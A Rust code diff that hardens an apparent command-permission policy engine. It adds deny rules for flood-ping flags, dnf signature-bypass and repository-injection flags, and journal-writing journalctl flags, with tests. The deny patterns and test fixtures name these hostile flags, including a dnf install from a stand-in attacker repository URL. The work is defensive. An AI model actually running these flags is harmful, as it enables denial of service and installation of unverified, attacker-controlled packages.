@@ -17,19 +17,57 @@ fn allow(command: &str, arg_pattern: Option<&str>) -> Rule {
     }
 }
 
+fn deny(command: &str, arg_pattern: &str) -> Rule {
+    Rule {
+        command: command.to_string(),
+        arg_pattern: Some(Regex::new(arg_pattern).unwrap()),
+        effect: Effect::Deny,
+    }
+}
+
+// NOTE (post-review fix, tier-level defence in depth): the `--` separators
+// added to the structured tool handlers (dnf.rs, network.rs, systemctl.rs)
+// only harden those handlers. `run_command` reaches the same binaries
+// straight through the policy layer, which is the actual security boundary,
+// so any dangerous flag the tier rules do not exclude is reachable in one
+// call regardless of what the tool files do. The deny-before-allow rules
+// below close the specific gaps found in review. `PolicyEngine::evaluate`
+// is first-match-wins, so each `Deny` must precede the broad `Allow` for
+// the same command.
+
+/// Flood-ping and interval-abuse flags. `ping -f` (and `-i` with a
+/// sub-second interval) turns a tier documented as "read-only diagnostics,
+/// no mutation of system state" into an outbound denial-of-service tool.
+/// The alternation is deliberately anchored to token starts so an ordinary
+/// `ping -c 4 host` (or a hostname merely containing an `f`) is unaffected.
+/// The first alternative matches a short-option token containing `f`,
+/// including clustered forms such as `-fc`; ping's only short option using
+/// `f` is `--flood`, so there is no legitimate flag this rejects.
+const PING_ABUSE_FLAGS: &str = r"(?:^|\s)-[A-Za-z]*f[A-Za-z]*(?:\s|$)|--flood|(?:^|\s)-i\s*0*\.\d";
+
+/// Flags that defeat dnf's integrity and repository trust model:
+/// `--nogpgcheck` skips signature verification, `--repofrompath` adds an
+/// attacker-controlled repository for the duration of the transaction, and
+/// `--setopt` can reach either of those (and more) indirectly. The tier's
+/// `^(install|remove|upgrade)` allow pattern matches the leading subcommand
+/// only and says nothing about the flags that follow it.
+const DNF_TRUST_BYPASS_FLAGS: &str = r"nogpgcheck|repofrompath|--setopt";
+
+/// journalctl subcommands and flags that write to `/var/log/journal`
+/// rather than read from it. `--setup-keys` generates and writes Forward
+/// Secure Sealing keys, so it belongs with the vacuum/rotate family even
+/// though its name does not suggest mutation.
+const JOURNALCTL_MUTATION_FLAGS: &str =
+    r"vacuum|--rotate|--flush|--sync|--relinquish-var|--setup-keys";
+
 fn safe_rules() -> Vec<Rule> {
     vec![
         allow("systemctl", Some("^status")),
         allow("systemctl", Some("^is-active")),
         allow("systemctl", Some("^is-enabled")),
-        Rule {
-            command: "journalctl".to_string(),
-            arg_pattern: Some(
-                Regex::new(r"vacuum|--rotate|--flush|--sync|--relinquish-var").unwrap(),
-            ),
-            effect: Effect::Deny,
-        },
+        deny("journalctl", JOURNALCTL_MUTATION_FLAGS),
         allow("journalctl", None),
+        deny("ping", PING_ABUSE_FLAGS),
         allow("ping", None),
         allow(
             "ip",
@@ -42,6 +80,7 @@ fn standard_rules() -> Vec<Rule> {
     let mut rules = safe_rules();
     rules.extend(vec![
         allow("systemctl", Some("^(start|stop|restart|enable|disable)")),
+        deny("dnf", DNF_TRUST_BYPASS_FLAGS),
         allow("dnf", Some("^(install|remove|upgrade)")),
         allow("rpm-ostree", Some("^(install|upgrade|status|uninstall)")),
     ]);
@@ -154,6 +193,127 @@ mod tests {
         assert!(matches!(
             engine.evaluate("journalctl", &["-u".into(), "sshd".into()]),
             Decision::Allowed
+        ));
+    }
+
+    // The tests below exercise the `run_command`-shaped path: a bare
+    // command plus raw argv, evaluated by the policy engine with no
+    // structured tool handler in between. That is the boundary the `--`
+    // separators in the tool files do not cover.
+
+    #[test]
+    fn safe_tier_denies_flood_ping_but_allows_an_ordinary_ping() {
+        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
+        for denied in [
+            vec!["-f".to_string(), "8.8.8.8".to_string()],
+            vec!["--flood".to_string(), "8.8.8.8".to_string()],
+            vec![
+                "-c".to_string(),
+                "100".to_string(),
+                "-f".to_string(),
+                "8.8.8.8".to_string(),
+            ],
+            vec!["-fc".to_string(), "100".to_string(), "8.8.8.8".to_string()],
+            vec!["-i".to_string(), "0.01".to_string(), "8.8.8.8".to_string()],
+            vec!["-i".to_string(), ".001".to_string(), "8.8.8.8".to_string()],
+            vec!["-i0.01".to_string(), "8.8.8.8".to_string()],
+        ] {
+            assert!(
+                matches!(engine.evaluate("ping", &denied), Decision::Denied(_)),
+                "ping {denied:?} should be denied under the safe tier"
+            );
+        }
+
+        for allowed in [
+            vec!["8.8.8.8".to_string()],
+            vec!["-c".to_string(), "4".to_string(), "8.8.8.8".to_string()],
+            vec![
+                "-c".to_string(),
+                "4".to_string(),
+                "-i".to_string(),
+                "1".to_string(),
+                "example.com".to_string(),
+            ],
+            // A hostname that merely contains an `f` must not trip the
+            // flood-flag pattern.
+            vec![
+                "-c".to_string(),
+                "4".to_string(),
+                "fedoraproject.org".to_string(),
+            ],
+            vec![
+                "-w".to_string(),
+                "5".to_string(),
+                "my-fileserver.local".to_string(),
+            ],
+        ] {
+            assert!(
+                matches!(engine.evaluate("ping", &allowed), Decision::Allowed),
+                "ping {allowed:?} should be allowed under the safe tier"
+            );
+        }
+    }
+
+    #[test]
+    fn standard_tier_denies_dnf_trust_bypass_flags_but_allows_a_plain_install() {
+        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
+        for denied in [
+            vec![
+                "install".to_string(),
+                "-y".to_string(),
+                "--nogpgcheck".to_string(),
+                "htop".to_string(),
+            ],
+            vec![
+                "install".to_string(),
+                "-y".to_string(),
+                "--repofrompath=evil,http://attacker.example/repo".to_string(),
+                "pkg".to_string(),
+            ],
+            vec![
+                "install".to_string(),
+                "--setopt=gpgcheck=0".to_string(),
+                "htop".to_string(),
+            ],
+            vec!["upgrade".to_string(), "--nogpgcheck".to_string()],
+        ] {
+            assert!(
+                matches!(engine.evaluate("dnf", &denied), Decision::Denied(_)),
+                "dnf {denied:?} should be denied under the standard tier"
+            );
+        }
+
+        assert!(matches!(
+            engine.evaluate("dnf", &["install".into(), "-y".into(), "htop".into()]),
+            Decision::Allowed
+        ));
+        assert!(matches!(
+            engine.evaluate("dnf", &["upgrade".into()]),
+            Decision::Allowed
+        ));
+    }
+
+    #[test]
+    fn safe_tier_denies_journalctl_setup_keys() {
+        let engine = PolicyEngine::new(rules_for_tier(&TierName::Safe));
+        assert!(matches!(
+            engine.evaluate("journalctl", &["--setup-keys".into()]),
+            Decision::Denied(_)
+        ));
+    }
+
+    #[test]
+    fn the_safe_tier_denials_are_inherited_by_the_standard_tier() {
+        // `standard_rules()` builds on `safe_rules()`, so a regression that
+        // reordered or dropped the inherited denies would show up here.
+        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
+        assert!(matches!(
+            engine.evaluate("ping", &["-f".into(), "8.8.8.8".into()]),
+            Decision::Denied(_)
+        ));
+        assert!(matches!(
+            engine.evaluate("journalctl", &["--setup-keys".into()]),
+            Decision::Denied(_)
         ));
     }
 }
